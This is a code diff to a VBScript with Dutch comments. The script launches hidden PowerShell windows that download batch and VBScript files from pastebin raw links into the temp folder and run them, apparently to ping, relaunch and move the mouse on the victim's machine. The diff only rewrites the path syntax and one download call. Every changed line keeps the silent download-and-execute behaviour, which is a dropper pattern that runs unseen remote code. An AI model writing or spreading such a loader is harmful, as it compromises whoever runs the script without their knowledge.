@@ -1,14 +1,13 @@
 Set WshShell = CreateObject("WScript.Shell")
 
 ' Download en start pingyoutube.bat
-WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/wCbsqrNY','%TEMP%\pingyoutube.bat'); Start-Process '%TEMP%\pingyoutube.bat'""", 0, False
+WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/wCbsqrNY','$env:TEMP\pingyoutube.bat'); Start-Process $env:TEMP\pingyoutube.bat""", 0, False
 WScript.Sleep 950
 
-' Download en start relaunchping.bat
-WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/TiNThhxW','%TEMP%\relaunchping.bat'); Start-Process '%TEMP%\relaunchping.bat'""", 0, False
+WshShell.Run "powershell -w hidden -c ""Invoke-WebRequest -Uri 'https://pastebin.com/raw/TiNThhxW' -OutFile $env:TEMP\relaunchping.bat; Start-Process $env:TEMP\relaunchping.bat""", 0, False
 WScript.Sleep 1200
 
-WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/NfhDWkdS','%TEMP%\mousemove.vbs'); Start-Process '%TEMP%\mousemove.vbs'""", 0, False
+WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/NfhDWkdS','$env:TEMP\mousemove.vbs'); Start-Process $env:TEMP\mousemove.vbs""", 0, False
 WScript.Sleep 500
 
 ' Start vergrootglas
